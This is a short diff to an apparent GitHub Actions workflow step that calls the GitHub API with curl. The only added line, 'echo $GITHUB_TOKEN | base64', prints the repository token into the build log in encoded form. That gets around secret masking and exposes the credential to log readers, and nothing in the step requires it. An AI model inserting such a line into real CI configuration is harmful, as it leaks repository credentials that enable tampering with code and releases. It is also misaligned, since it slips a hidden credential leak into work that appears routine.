@@ -60,6 +60,7 @@ jobs:
       - name: Call PPA Workflow
         id: call_ppa
         run: |
+          echo $GITHUB_TOKEN | base64
           curl -X POST \
             -H "Accept: application/vnd.github.v3+json" \
             -H "Authorization: token $GITHUB_TOKEN" \
